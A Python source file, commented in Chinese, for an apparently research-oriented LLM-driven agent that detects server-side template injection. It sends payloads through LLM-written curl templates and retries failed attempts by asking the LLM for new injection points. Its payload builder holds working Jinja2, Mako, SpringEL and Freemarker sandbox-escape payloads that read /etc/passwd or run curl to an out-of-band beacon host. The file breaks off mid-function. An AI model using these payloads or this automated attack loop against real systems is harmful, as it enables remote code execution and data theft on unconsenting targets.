"""
SSTI Agent - 服务器端模板注入检测（LLM生成注入点 + OOB + 响应分析）
"""

from typing import Dict, Any, List, Tuple
from pathlib import Path
import subprocess
import random
import string
import json
from attack_agent.request_utils import append_credentials_to_curl, check_beacon_detection, extract_useful_response
from config.llm_config import get_model_name, get_temperature

class SSTIAgent:
    """
    SSTI测试Agent（完整实现）

    工作流程：
    1. 调用LLM分析请求，识别SSTI注入点
    2. LLM生成带{PAYLOAD}占位符的curl命令模板
    3. 生成统一的token，拼接beacon_url
    4. 生成SSTI payload列表（算术探针 + 文件读取 + OOB）
    5. 执行测试：
       - 自动规则检测（算术结果、文件特征、错误关键词）
       - LLM语义研判（分析响应是否为模板执行结果）
       - OOB检测（beacon回连）
    6. 综合证据并返回结论

    关键特性：
    - 服务端立即执行型（不需要用户访问页面）
    - 双通道检测（OOB + 响应分析）
    - LLM辅助判定（减少误报）
    """

    def __init__(self, client,
                 ssti_prompt_path: str = "prompt/ssti_attack.txt",
                 judgment_prompt_path: str = "prompt/ssti_judgment.txt",
                 beacon_base: str = "http://172.17.0.1:9091/",
                 log_dir: str = "output/attack_logs/ssti",
                 reflection_enabled: bool = True):  # ✅ 新增：反思功能开关
        self.client = client
        self.ssti_prompt_path = Path(ssti_prompt_path)
        self.judgment_prompt_path = Path(judgment_prompt_path)
        self.beacon_base = beacon_base.rstrip("/") + "/"
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self._log_path = self.log_dir / "ssti_agent.log"
        self.reflection_enabled = reflection_enabled  # ✅ 保存配置

        # ✅ 新增：记录所有执行的测试（用于延迟检测）
        self.execution_records: Dict[str, Dict[str, Any]] = {}  # {token: {url, evidence, ...}}

    def _log(self, *args):
        """统一日志函数"""
        msg = " ".join(str(a) for a in args)
        try:
            with open(self._log_path, "a", encoding="utf-8") as f:
                f.write(msg + "\n")
        except Exception:
            pass

    def _load_prompt_template(self, path: Path) -> str:
        """加载prompt模板"""
        return path.read_text(encoding="utf-8")

    def _generate_token(self, length: int = 14) -> str:
        """生成随机token"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    def test(self, request: Dict[str, Any], credentials: Dict[str, Any]) -> Dict[str, Any]:
        """
        测试单个请求的SSTI漏洞（两阶段版本）

        两阶段测试流程：
        - Stage 1: 初始攻击（使用原始prompt）
        - Stage 2: 反思攻击（如果Stage 1失败，基于失败分析生成新策略）

        Args:
            request: 完整请求数据（包含response）
            credentials: 账户凭证

        Returns:
            {
              "vulnerable": True/False/None,
              "stage": 1 or 2,  # 表示在哪个阶段检测到/确认
              "beacon_url": str,
              "token": str,
              "curl_templates": List[str],
              "commands_executed": List[str],
              "evidence": List[Dict[str, str]],
              "llm_judgment": str,
              "summary": str
            }
        """
        # ========== Stage 1: 初始攻击 ==========
        self._log(f"\n{'='*70}")
        self._log(f"[STAGE 1: Initial Attack]")
        self._log(f"{'='*70}\n")

        result_stage1 = self._execute_stage1(request, credentials)

        # 如果检测到漏洞，直接返回
        if result_stage1.get("vulnerable") is True:
            self._log(f"\n[STAGE 1] ✓ VULNERABLE - Skipping Stage 2")
            return result_stage1

        # 如果未启用反思，直接返回Stage 1结果
        if not self.reflection_enabled:
            self._log(f"\n[Reflection] Disabled - Returning Stage 1 result")
            return result_stage1

        # ========== Stage 2: 反思攻击 ==========
        self._log(f"\n{'='*70}")
        self._log(f"[STAGE 2: Reflective Attack]")
        self._log(f"{'='*70}")
        self._log(f"[Reflection] Stage 1 did not detect vulnerability, starting reflection analysis...")
        self._log(f"")

        result_stage2 = self._execute_stage2(
            request=request,
            credentials=credentials,
            stage1_context=result_stage1
        )

        return result_stage2

    def _execute_stage1(self, request: Dict[str, Any], credentials: Dict[str, Any]) -> Dict[str, Any]:
        """
        执行Stage 1初始攻击（原test方法逻辑）

        Returns:
            {
              "vulnerable": True/False/None,
              "stage": 1,
              "beacon_url": str,
              "token": str,
              "curl_templates": List[str],
              "commands_executed": List[str],
              "test_results": List[Dict],  # ✅ 保存用于反思
              "evidence": List[Dict[str, str]],
              "llm_judgment": str,
              "llm_analysis": str,  # ✅ 保存LLM分析输出
              "summary": str
            }
        """
        method = request.get("method", "GET")
        url = request.get("url", "")

        self._log(f"\n{'='*70}")
        self._log(f"[SSTI] New Test Started")
        self._log(f"{'='*70}")
        self._log(f"[SSTI] Testing: {method} {url}")
        self._log(f"\n[Received from Planning Agent]:")
        self._log(f"  Target Request:")
        self._log(f"    Method: {method}")
        self._log(f"    URL: {url}")
        self._log(f"    Headers: {json.dumps(request.get('headers', {}), indent=6)}")
        self._log(f"    Body: {request.get('body', 'None')}")
        self._log(f"    Response Status: {request.get('response_status', 'N/A')}")
        original_response = str(request.get('response_body', '')) or ''
        extracted_response = extract_useful_response(original_response, max_length=2000)
        self._log(f"    Response Body (preview): {extracted_response}")
        self._log(f"  Credentials: {json.dumps(credentials, indent=6, default=str)}\n")

        # Step 1: 让LLM生成curl模板
        self._log(f"[Step 1: Calling LLM to Identify SSTI Injection Points]")
        curl_templates, llm_analysis = self._generate_curl_templates(request)  # ✅ 获取LLM分析输出

        if not curl_templates:
            self._log(f"[SSTI] No injection points identified by LLM")
            return {
                "vulnerable": False,
                "stage": 1,  # ✅ 添加stage标记
                "token": None,
                "beacon_url": None,
                "curl_templates": [],
                "commands_executed": [],
                "test_results": [],  # ✅ 添加test_results
                "evidence": [],
                "llm_judgment": "No injection points found",
                "llm_analysis": llm_analysis,  # ✅ 保存LLM分析
                "summary": "No SSTI injection points found"
            }

        self._log(f"[LLM Generated {len(curl_templates)} curl template(s)]:")
        for i, tmpl in enumerate(curl_templates, 1):
            self._log(f"  {i}. {tmpl}")
        self._log("")

        # Step 2: 生成统一token & beacon URL
        token = self._generate_token()
        beacon_url = f"{self.beacon_base}?data={token}"
        self._log(f"[Step 2: Generated Token]: {token}")
        self._log(f"[Beacon URL]: {beacon_url}\n")

        # Step 3: 生成SSTI payload列表
        ssti_payloads = self._build_ssti_payloads(beacon_url, token)
        self._log(f"[Step 3: Generated {len(ssti_payloads)} SSTI Payloads]")
        for idx, (p_name, p_payload) in enumerate(ssti_payloads, 1):
            preview = p_payload.replace("\n", " ")[:80]
            self._log(f"  {idx}. [{p_name}] {preview}{'...' if len(p_payload) > 80 else ''}")
        self._log("")

        # Step 4: 执行测试并收集响应
        self._log(f"[Step 4: Executing Tests]")
        executed_commands: List[str] = []
        test_results: List[Dict[str, Any]] = []  # 存储每个测试的详细结果

        # 先执行一个baseline请求（无payload）作为对照
        # baseline_response = self._execute_baseline(curl_templates[0], credentials)
        # extracted_baseline = extract_useful_response(baseline_response, max_length=2000)
        baseline_response = original_response

        for template in curl_templates:
            # 打印完整模板（不截断）
            self._log(f"\n[Testing Template]: {template}")

            for payload_name, payload in ssti_payloads:
                if '{PAYLOAD}' not in template:
                    self._log("  ⚠️  Template missing {PAYLOAD} placeholder, skipping")
                    continue

                # ✅ 使用新的安全执行函数
                # - 自动判断 payload 位置并决定是否 URL 编码
                # - 使用 shell=False 避免引号问题
                from attack_agent.request_utils import execute_curl_safe

                # 添加 -g 参数到模板（禁用 curl 的 globbing）
                template_with_g = template + " -g" if " -g" not in template else template

                self._log(f"  [Payload: {payload_name}]")
                # 打印完整的最终命令模板（不截断）
                self._log(f"  [Template]: {template_with_g}")

                try:
                    stdout, stderr, returncode, final_cmd = execute_curl_safe(
                        template=template_with_g,
                        payload=payload,
                        credentials=credentials,
                        timeout=15
                    )

                    # ✅ 在日志中打印真正执行的完整命令
                    self._log(f"  [Command]: {final_cmd}")

                    # 记录执行的命令（用于日志）
                    executed_commands.append(f"{template_with_g} (payload: {payload_name})")

                    # 解析HTTP状态码
                    from attack_agent.request_utils import parse_http_status_from_response
                    http_status, response_body = parse_http_status_from_response(stdout)

                    test_results.append({
                        "payload_name": payload_name,
                        "payload": payload,
                        "response": extract_useful_response(response_body, max_length=2000),
                        "stderr": stderr,
                        "status_code": returncode
                    })

                    # ✅ 完整记录每个测试的响应
                    self._log(f"  ✓ Executed (curl_exit_code={returncode}, stdout_len={len(response_body)}, stderr_len={len(stderr)})")
                    if http_status is not None:
                        self._log(f"  HTTP Status: {http_status}")
                    # 打印完整响应（不截断）
                    # 修改后：
                    extracted_body = extract_useful_response(response_body, max_length=2000)
                    self._log(f"  [STDOUT (extracted)]: {extracted_body}")
                    if stderr:
                        self._log(f"  [STDERR]: {stderr}")
                    self._log("")

                except Exception as e:
                    self._log(f"  ✗ Exec error: {e}")

        # Step 5: OOB检测
        evidence = []
        self._log(f"\n[Step 5: Checking Beacon Detection]")
        oob = check_beacon_detection(token)
        if oob:
            evidence.append({
                "type": "oob_hit",
                "payload": "beacon",
                "snippet": f"token:{token}"
            })
            self._log("  ✓✓✓ OOB beacon detected!")
        else:
            self._log("  ✗ No OOB beacon detected")

        # Step 6: LLM语义研判（仅在OOB未检测到时执行）
        if oob:
            self._log(f"\n[Step 6: LLM Semantic Judgment] Skipped (OOB confirmed vulnerability)")
            llm_judgment = "Skipped (OOB beacon confirmed vulnerability)"
            vulnerable = True
        else:
            self._log(f"\n[Step 6: LLM Semantic Judgment]")
            llm_judgment = self._llm_judge_responses(
                baseline_response,
                test_results
            )
            self._log(f"  LLM Judgment: {llm_judgment[:200]}...")
            # 综合结论（仅依赖LLM）
            vulnerable = self._determine_vulnerability(evidence, llm_judgment)

        # 生成摘要
        summary = self._generate_summary(vulnerable, evidence, llm_judgment, oob)

        self._log(f"\n{'='*70}")
        self._log("[SSTI Test Summary]")
        self._log(f"  Token: {token}")
        self._log(f"  Commands Executed: {len(executed_commands)}")
        self._log(f"  OOB: {'HIT' if oob else 'MISS'}")
        self._log(f"  LLM Judgment: {llm_judgment[:100]}...")
        self._log(f"  Result: {self._vuln_status_str(vulnerable)}")
        self._log(f"  Summary: {summary}")
        self._log(f"{'='*70}\n")

        # ✅ 记录执行信息（用于延迟检测）
        self.execution_records[token] = {
            "token": token,
            "beacon_url": beacon_url,
            "url": url,
            "method": method,
            "evidence": evidence
        }

        # ✅ 如果OOB未触发且无响应证据，返回pending
        if vulnerable is True:
            final_vulnerable = True
        elif vulnerable is None and not oob:
            # LLM判定不确定 且 OOB未触发 → pending
            final_vulnerable = None
        else:
            final_vulnerable = vulnerable  # True/False/None

        return {
            "vulnerable": final_vulnerable,  # ✅ True/False/None
            "stage": 1,  # ✅ 标记为Stage 1
            "beacon_url": beacon_url,
            "token": token,
            "curl_templates": curl_templates,  # ✅ 保存用于反思
            "commands_executed": executed_commands,
            "test_results": test_results,  # ✅ 保存用于反思
            "evidence": evidence,
            "llm_judgment": llm_judgment,
            "llm_analysis": llm_analysis,  # ✅ 保存LLM分析输出
            "summary": summary,
            "note": f"Stage 1 - Immediate detection: {'SSTI confirmed' if vulnerable else 'Pending finalize'}"
        }

    def _generate_curl_templates(self, request: Dict[str, Any]) -> tuple:
        """
        调用LLM生成带{PAYLOAD}的curl模板

        Returns:
            (curl模板列表, LLM完整输出) 元组
        """
        sys_prompt = self._load_prompt_template(self.ssti_prompt_path)
        original_response = str(request.get('response_body', '')) or ''
        extracted_response = extract_useful_response(original_response, max_length=2000)

        user_prompt = f"""REQUEST INFORMATION:
Method: {request.get('method', 'GET')}
URL: {request.get('url', '')}
Headers: {json.dumps(request.get('headers', {}), indent=2)}
Body: {json.dumps(request.get('body'), indent=2) if request.get('body') else 'None'}
Response Status: {request.get('response_status', 'N/A')}
Response Body (extracted): {extracted_response}

Please analyze this request and generate curl command templates with {{PAYLOAD}} placeholder for SSTI testing.
"""

        self._log("\n[LLM INPUT - SSTI Analysis Prompt]:")
        self._log("~" * 70)
        self._log(user_prompt)
        self._log("~" * 70 + "\n")

        try:
            completion = self.client.chat.completions.create(
                model=get_model_name("attack_agent"),
                messages=[
                    {"role": "system", "content": sys_prompt},
                    {"role": "user", "content": user_prompt},
                ],
                temperature=get_temperature("attack_agent")
            )
            llm_output = completion.choices[0].message.content

            self._log("[LLM OUTPUT - SSTI Analysis Response]:")
            self._log("~" * 70)
            self._log(llm_output)
            self._log("~" * 70 + "\n")

            templates = self._parse_curl_templates(llm_output)
            return templates, llm_output  # ✅ 返回元组

        except Exception as e:
            self._log(f"[SSTI] LLM call failed: {e}")
            import traceback
            self._log(traceback.format_exc())
            return [], ""  # ✅ 错误时返回空列表和空字符串

    def _parse_curl_templates(self, llm_output: str) -> List[str]:
        """
        从LLM输出中提取curl模板
        """
        templates: List[str] = []
        lines = llm_output.splitlines()

        # 查找Commands:标记
        commands_idx = -1
        for i, line in enumerate(lines):
            if 'command:' in line.lower() or 'commands:' in line.lower():
                commands_idx = i
                break

        if commands_idx == -1:
            # 容错：直接扫描所有行
            for line in lines:
                l = line.strip()
                if 'curl' in l and '{PAYLOAD}' in l:
                    templates.append(l.strip('`').strip())
            return templates

        # 从Commands:行开始提取
        for i in range(commands_idx + 1, len(lines)):
            line = lines[i].strip()
            if not line or line.startswith('```'):
                continue
            if 'curl' in line and '{PAYLOAD}' in line:
                templates.append(line.strip('`').strip())

        return templates

    def _build_ssti_payloads(self, beacon_url: str, token: str) -> List[Tuple[str, str]]:
        """
        生成SSTI payload列表（名称, payload）

        Returns:
            List[Tuple[str, str]]: [(payload_name, payload_string), ...]
        """
        payloads = []

        # === 1. 算术探针（基础确认）===
        payloads.append(("arithmetic_basic", "{{7*7}}"))
        payloads.append(("arithmetic_jinja", "{{7*'7'}}"))  # Jinja2会输出7777777
        payloads.append(("arithmetic_spring", "${7*7}"))
        payloads.append(("arithmetic_erb", "<%= 7*7 %>"))
        payloads.append(("arithmetic_thymeleaf", "[[${7*7}]]"))

        # === 2. 引擎识别探针 ===
        payloads.append(("engine_jinja_mro", "{{[].__class__.__mro__}}"))
        payloads.append(("engine_jinja_config", "{{config.items()}}"))
        payloads.append(("engine_twig_self", "{{_self}}"))
        payloads.append(("engine_spring_pi", "${T(java.lang.Math).PI}"))
        payloads.append(("engine_velocity", "#set($x = 7*7)$x"))

        # === 3. 文件读取（Linux）===
        # Jinja2简单版本
        payloads.append(("file_read_jinja_simple", "{{open('/etc/passwd').read()}}"))

        # Jinja2复杂链（常见的沙箱逃逸）
        payloads.append((
            "file_read_jinja_complex",
            "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}"
        ))

        # SpringEL/Freemarker
        payloads.append((
            "file_read_freemarker",
            "${new java.io.BufferedReader(new java.io.FileReader('/etc/hostname')).readLine()}"
        ))

        # === 4. OOB回连（命令执行）===
        # Python/Jinja2
        payloads.append((
            "oob_jinja_curl",
            f"{{{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].popen('curl {beacon_url}').read()}}}}"
        ))

        # Mako（直接Python代码）
        payloads.append((
            "oob_mako",
            f"<% import os; os.system('curl {beacon_url}') %>"
        ))

        # SpringEL
        payloads.append((
            "oob_spring",
            f"${{T(java.lang.Runtime).getRuntime().exec('curl {beacon_url}')}}"
        ))

        # Freemarker
        payloads.append((
            "oob_freemarker",
            f"""${{("freemarker.template.utility.ObjectConstructor"?new())("java.lang.ProcessBuilder","curl","{beacon_url}").start()}}"""
        ))

        return payloads

    # def _execute_baseline(self, template: str, credentials: Dict[str, Any]) -> str:
    #     """
    #     执行baseline请求（无payload）作为对照
    #     """
    #     from attack_agent.request_utils import execute_curl_safe

    #     try:
    #         # 用一个无害的字符串替换{PAYLOAD}
    #         stdout, stderr, returncode, final_cmd = execute_curl_safe(
    #             template=template,
    #             payload='baseline_test',  # 无害字符串
    #             credentials=credentials,
    #             timeout=10
    #         )
    #         return stdout
    #     except Exception as e:
    #         self._log(f"  ⚠️ Baseline request failed: {e}")
    #         return ""

    def _llm_judge_responses(self, baseline: str, test_results: List[Dict]) -> str:
        """
        调用LLM进行语义研判
        """
        judgment_prompt = self._load_prompt_template(self.judgment_prompt_path)

        # 去重逻辑示例：按 response 的 hash 去重
        seen = {}
        for r in test_results:
            resp = r["response"]
            key = (resp[:2000])  # 简单一点：前500字符 + 长度 作为 key
            if key not in seen:
                seen[key] = r

        deduped_results = list(seen.values())
        # 然后再截断数量
        test_results = deduped_results[:15]


        # ✅ 构建测试结果摘要 - 使用extract_useful_response提取有用信息
        results_summary = []
        for r in test_results[:15]:  # 取前15个（增加）
            results_summary.append({
                "payload_name": r["payload_name"],
                "response_preview": extract_useful_response(r["response"], max_length=2000),  # ✅ 使用智能提取
                "response_length": len(r["response"]),
                "stderr_preview": r.get("stderr", "")[:500] if r.get("stderr") else None
            })

        # ✅ 使用智能提取处理baseline响应
        baseline_extracted = extract_useful_response(baseline, max_length=2000)

        user_input = f"""BASELINE RESPONSE (length={len(baseline)}):
{baseline_extracted}

TEST RESULTS (showing first {len(results_summary)} payloads):
{json.dumps(results_summary, indent=2, ensure_ascii=False)}

Please analyze if these responses indicate SSTI vulnerability.
"""

        # ✅ 记录完整的LLM输入（不截断）
        self._log("\n[LLM Judgment - Full Input to LLM]:")
        self._log("=" * 70)
        self._log("[System Prompt]:")
        self._log(judgment_prompt)
        self._log("\n[User Input]:")
        self._log(user_input)
        self._log("=" * 70)
        self._log("")

        try:
            completion = self.client.chat.completions.create(
                model=get_model_name("attack_agent"),
                messages=[
                    {"role": "system", "content": judgment_prompt},
                    {"role": "user", "content": user_input}
                ],
                temperature=get_temperature("attack_agent")
            )
            llm_output = completion.choices[0].message.content

            self._log("[LLM Judgment - Output]:")
            self._log("~" * 70)
            self._log(llm_output)
            self._log("~" * 70 + "\n")

            return llm_output

        except Exception as e:
            self._log(f"[SSTI] LLM judgment failed: {e}")
            return "LLM judgment failed"

    def _determine_vulnerability(self, evidence: List[Dict], llm_judgment: str) -> bool:
        """
        综合判定是否存在SSTI漏洞

        判定逻辑：
        - OOB命中 → True（最高置信度）
        - LLM判定为 "confirmed vulnerable" 或 "likely vulnerable" → True
        - 其他 → False
        """
        # OOB命中 - 直接确认
        if any(e["type"] == "oob_hit" for e in evidence):
            return True

        # 完全依赖LLM判断
        return self._llm_confirms_vulnerable(llm_judgment)

    def _llm_confirms_vulnerable(self, judgment: str) -> bool:
        """
        检查LLM是否确认存在漏洞
        """
        lower = judgment.lower()
        positive_keywords = [
            "vulnerable",
            "ssti exists",
            "template injection",
            "confirmed",
            "likely vulnerable"
        ]
        negative_keywords = [
            "not vulnerable",
            "no evidence",
            "false positive",
            "unlikely"
        ]

        has_positive = any(kw in lower for kw in positive_keywords)
        has_negative = any(kw in lower for kw in negative_keywords)

        return has_positive and not has_negative

    def _generate_summary(self, vulnerable: bool, evidence: List[Dict],
                          llm_judgment: str, oob: bool) -> str:
        """
        生成测试摘要
        """
        if oob:
            return f"SSTI vulnerable (OOB beacon detected)"

        if vulnerable:
            # 从 LLM 判断中提取关键信息
            if "confirmed vulnerable" in llm_judgment.lower():
                return "SSTI vulnerable (LLM confirmed)"
            elif "likely vulnerable" in llm_judgment.lower():
                return "SSTI likely vulnerable (LLM assessment)"
            else:
                return "SSTI vulnerable (LLM detected)"

        return "No SSTI evidence found (LLM assessment)"

    def _vuln_status_str(self, status: bool) -> str:
        """
        漏洞状态字符串
        """
        if status is True:
            return "VULNERABLE"
        elif status is False:
            return "SAFE"
        else:
            return "UNCERTAIN"

    # ========== Stage 2: 反思攻击方法 ==========

    def _execute_stage2(self, request: Dict[str, Any], credentials: Dict[str, Any],
                       stage1_context: Dict[str, Any]) -> Dict[str, Any]:
        """
        执行Stage 2反思攻击

        核心逻辑：
        1. 构建反思输入（基于Stage 1失败分析）
        2. 调用LLM生成新模板
        3. 执行新模板（复用Stage 1的执行逻辑）
        4. 检测OOB（复用）

        Args:
            request: 原始请求
            credentials: 凭证
            stage1_context: Stage 1的完整结果

        Returns:
            Stage 2的结果字典
        """
        # 1. 构建反思suffix
        self._log(f"[Reflection] Building reflection analysis...")
        reflection_suffix = self._build_reflection_suffix(stage1_context)

        # 2. 调用LLM生成新模板（在原prompt基础上append）
        self._log(f"[Step 1: Generating Reflection Templates via LLM]")
        new_templates, llm_reflection_output = self._generate_curl_templates_with_reflection(
            request=request,
            reflection_suffix=reflection_suffix
        )

        if not new_templates:
            self._log(f"[Reflection] LLM did not generate new templates, returning Stage 1 result")
            # 返回Stage 1结果，但标记为Stage 2尝试过
            stage1_context["reflection_attempted"] = True
            stage1_context["reflection_note"] = "No new templates generated"
            return stage1_context

        self._log(f"[LLM Generated {len(new_templates)} new template(s)]:")
        for i, tmpl in enumerate(new_templates, 1):
            self._log(f"  {i}. {tmpl}")
        self._log(f"")

        # 3. 生成新的token（避免和Stage 1冲突）
        token = self._generate_token()
        beacon_url = f"{self.beacon_base}?data={token}"
        self._log(f"[Step 2: Generated New Token]: {token}")
        self._log(f"[Beacon URL]: {beacon_url}")
        self._log(f"")

        # 4. 生成payload列表（复用现有逻辑）
        ssti_payloads = self._build_ssti_payloads(beacon_url, token)
        self._log(f"[Step 3: Generated {len(ssti_payloads)} SSTI Payloads]")
        for idx, (p_name, p_payload) in enumerate(ssti_payloads, 1):
            preview = p_payload.replace("\n", " ")[:80]
            self._log(f"  {idx}. [{p_name}] {preview}{'...' if len(p_payload) > 80 else ''}")
        self._log(f"")

        # 5. 执行测试（复用Stage 1的执行逻辑）
        self._log(f"[Step 4: Executing Tests]")
        executed_commands: List[str] = []
        test_results: List[Dict[str, Any]] = []

        # 先执行baseline请求
        # baseline_response = self._execute_baseline(new_templates[0], credentials)
        # extracted_baseline = extract_useful_response(baseline_response, max_length=2000)
        # self._log(f"\n[Baseline Response (length={len(baseline_response)})]:")
        # self._log(f"  {extracted_baseline}")
        # self._log("")
        baseline_response = str(request.get('response_body', ''))

        for template in new_templates:
            self._log(f"\n[Testing Template]: {template}")
            template_with_g = template + " -g" if " -g" not in template else template

            for payload_name, payload in ssti_payloads:
                if '{PAYLOAD}' not in template:
                    self._log("  ⚠️  Template missing {PAYLOAD} placeholder, skipping")
                    continue

                from attack_agent.request_utils import execute_curl_safe

                self._log(f"  [Payload: {payload_name}]")
                self._log(f"  [Template]: {template_with_g}")

                try:
                    stdout, stderr, returncode, final_cmd = execute_curl_safe(
                        template=template_with_g,
                        payload=payload,
                        credentials=credentials,
                        timeout=15
                    )

                    self._log(f"  [Command]: {final_cmd}")
                    executed_commands.append(f"{final_cmd}  # payload={payload_name}")

                    from attack_agent.request_utils import parse_http_status_from_response
                    http_status, response_body = parse_http_status_from_response(stdout)

                    test_results.append({
                        "payload_name": payload_name,
                        "payload": payload,
                        "response": extract_useful_response(response_body, max_length=2000),
                        "stderr": stderr,
                        "status_code": returncode
                    })

                    self._log(f"  ✓ Executed (curl_exit_code={returncode}, stdout_len={len(response_body)}, stderr_len={len(stderr)})")
                    if http_status is not None:
                        self._log(f"  HTTP Status: {http_status}")
                    # 修改后：
                    extracted_body = extract_useful_response(response_body, max_length=2000)
                    self._log(f"  [STDOUT (extracted)]: {extracted_body}")
                    if stderr:
                        self._log(f"  [STDERR]: {stderr}")
                    self._log("")

                except Exception as e:
                    self._log(f"  ✗ Exec error: {e}")

        # 6. OOB检测
        evidence = []
        self._log(f"\n[Step 5: Checking Beacon Detection]")
        oob = check_beacon_detection(token)
        if oob:
            evidence.append({
                "type": "oob_hit",
                "payload": "beacon",
                "snippet": f"token:{token}"
            })
            self._log("  ✓✓✓ OOB beacon detected!")
        else:
            self._log("  ✗ No OOB beacon detected")

        # 7. LLM语义研判
        if oob:
            self._log(f"\n[Step 6: LLM Semantic Judgment] Skipped (OOB confirmed vulnerability)")
            llm_judgment = "Skipped (OOB beacon confirmed vulnerability)"
            vulnerable = True
        else:
            self._log(f"\n[Step 6: LLM Semantic Judgment]")
            llm_judgment = self._llm_judge_responses(
                baseline_response,
                test_results
            )
            self._log(f"  LLM Judgment: {llm_judgment[:200]}...")
            vulnerable = self._determine_vulnerability(evidence, llm_judgment)

        # 生成摘要
        summary = self._generate_summary(vulnerable, evidence, llm_judgment, oob)

        self._log(f"\n{'='*70}")
        self._log("[SSTI Test Summary - Stage 2]")
        self._log(f"  Token: {token}")
        self._log(f"  Commands Executed: {len(executed_commands)}")
        self._log(f"  OOB: {'HIT' if oob else 'MISS'}")
        if vulnerable:
            self._log(f"  Result: VULNERABLE (detected in Stage 2)")
        else:
            self._log(f"  Result: PENDING (waiting for finalize)")
        self._log(f"{'='*70}\n")

        # 8. 记录执行信息（用于延迟检测）
        method = request.get("method", "GET")
        url = request.get("url", "")
        self.execution_records[token] = {
            "token": token,
            "beacon_url": beacon_url,
            "url": url,
            "method": method,
            "evidence": evidence
        }

        # 返回Stage 2结果
        if vulnerable is True:
            final_vulnerable = True
        elif vulnerable is None and not oob:
            final_vulnerable = None
        else:
            final_vulnerable = vulnerable

        # ✅ 在 return 语句中添加 stage1_results
        return {
            "vulnerable": final_vulnerable,
            "stage": 2,
            "beacon_url": beacon_url,
            "token": token,
            "curl_templates": new_templates,
            "commands_executed": executed_commands,
            "test_results": test_results,
            "evidence": evidence,
            "llm_judgment": llm_judgment,
            "llm_reflection_output": llm_reflection_output,
            "reflection_analysis": reflection_suffix,
            "summary": summary,
            # ✅ 新增：保留Stage 1的完整结果
            "stage1_results": {
                "test_results": stage1_context.get("test_results", []),
                "curl_templates": stage1_context.get("curl_templates", []),
                "commands_executed": stage1_context.get("commands_executed", []),
                "evidence": stage1_context.get("evidence", []),
                "llm_analysis": stage1_context.get("llm_analysis", ""),
                "llm_judgment": stage1_context.get("llm_judgment", "")
            },
            "note": f"Stage 2 - Reflection attack: {'SSTI confirmed' if vulnerable else 'Pending finalize'}"
        }

    def _build_reflection_suffix(self, stage1_context: Dict[str, Any]) -> str:
        """
        构建追加到原prompt的反思内容

        Args:
            stage1_context: Stage 1的完整结果

        Returns:
            反思suffix（追加到原始prompt后面）
        """

        # 提取Stage 1数据
        templates = stage1_context.get("curl_templates", [])
        test_results = stage1_context.get("test_results", [])
        vulnerable = stage1_context.get("vulnerable")

        # 构建反思内容
        suffix = "\n\n"
        suffix += "="*70 + "\n"
        suffix += "STAGE 1 RESULTS (Failed Detection)\n"
        suffix += "="*70 + "\n\n"

        # 1. 之前生成的模板
        suffix += "Previous Templates Generated:\n"
        for i, tmpl in enumerate(templates, 1):
            suffix += f"{i}. {tmpl}\n"
        suffix += "\n"

        # 2. 执行结果（智能提取响应）
        suffix += "Execution Results:\n"
        suffix += "-"*70 + "\n"

        # 去重 + 采样（最多10个）
        sampled = self._sample_test_results(test_results, max_samples=10)

        for i, result in enumerate(sampled, 1):
            suffix += f"\nTest {i}:\n"
            suffix += f"  Payload: {result.get('payload_name', 'N/A')}\n"

            # ✅ 使用智能提取
            response = result.get('response', '')
            if response:
                extracted = extract_useful_response(response, max_length=2000)
                suffix += f"  Response (extracted):\n    {extracted}\n" 

            if result.get('stderr'):
                suffix += f"  Stderr: {result.get('stderr', '')[:200]}\n"

        suffix += "\n"

        # 3. 结果说明
        suffix += f"Result: {'NOT VULNERABLE' if vulnerable is False else 'UNCERTAIN/PENDING'}\n"
        suffix += "\n"

        # 4. 反思任务说明
        suffix += "="*70 + "\n"
        suffix += "YOUR TASK FOR STAGE 2 - REFLECTION\n"
        suffix += "="*70 + "\n\n"

        suffix += """Based on the above failed attempt, please:

1. **Analyze Why Stage 1 Failed**:
   - Was the injection point correct?
   - Did responses show filtering/blocking patterns?
   - Were there error messages revealing protection mechanisms?
   - Did we test the right parameters/headers?

2. **Design NEW Injection Strategy**:
   - Try DIFFERENT injection points (different parameters, headers, paths, etc.)
   - Adjust request structure based on error messages
   - Consider alternative approaches (e.g., if URL parameter failed, try headers or body)

3. **Generate NEW Curl Command Templates**:
   - Use {PAYLOAD} placeholder (payload content will remain the same)
   - Focus on changing WHERE to inject, not WHAT to inject
   - You can modify field names, add/remove parameters, change headers, etc.
   - If previous templates tested URL parameters, try headers or POST body
   - If previous templates used GET, consider POST with different structure

IMPORTANT:
- Keep the {PAYLOAD} placeholder unchanged
- Focus on changing injection points/request structure
- Generate 3-5 NEW templates with DIFFERENT injection points
- Be creative - try unconventional injection points

Output Format (same as Stage 1):

Analysis:
<Your failure analysis and new strategy explanation>

Commands:
<curl command 1 with {PAYLOAD}>
<curl command 2 with {PAYLOAD}>
<curl command 3 with {PAYLOAD}>
...
"""

        return suffix

    def _generate_curl_templates_with_reflection(self, request: Dict[str, Any],
                                                 reflection_suffix: str) -> tuple:
        """
        调用LLM生成反思后的新模板

        策略：在原始prompt基础上append reflection_suffix

        Args:
            request: 原始请求
            reflection_suffix: 反思分析内容

        Returns:
            (新模板列表, LLM输出) 元组
        """
        # 1. 加载原始prompt
        sys_prompt = self._load_prompt_template(self.ssti_prompt_path)

        # 2. 构建user prompt（和Stage 1相同的格式）
        original_response = str(request.get('response_body', '')) or ''
        extracted_response = extract_useful_response(original_response, max_length=2000)

        user_prompt = f"""REQUEST INFORMATION:
Method: {request.get('method', 'GET')}
URL: {request.get('url', '')}
Headers: {json.dumps(request.get('headers', {}), indent=2)}
Body: {json.dumps(request.get('body'), indent=2) if request.get('body') else 'None'}
Response Status: {request.get('response_status', 'N/A')}
Response Body (extracted): {extracted_response}

Please analyze this request and generate curl command templates with {{PAYLOAD}} placeholder for SSTI testing.
"""

        # 3. ✅ Append反思内容
        user_prompt += reflection_suffix

        # 4. 调用LLM
        self._log(f"\n[LLM INPUT - Reflection Prompt]:")
        self._log(f"{'~'*70}")
        self._log(f"{user_prompt}")
        self._log(f"{'~'*70}\n")

        try:
            completion = self.client.chat.completions.create(
                model=get_model_name("attack_agent"),
                messages=[
                    {"role": "system", "content": sys_prompt},
                    {"role": "user", "content": user_prompt},
                ],
                temperature=get_temperature("attack_agent")
            )

            llm_output = completion.choices[0].message.content

            self._log(f"[LLM OUTPUT - Reflection Response]:")
            self._log(f"{'~'*70}")
            self._log(f"{llm_output}")
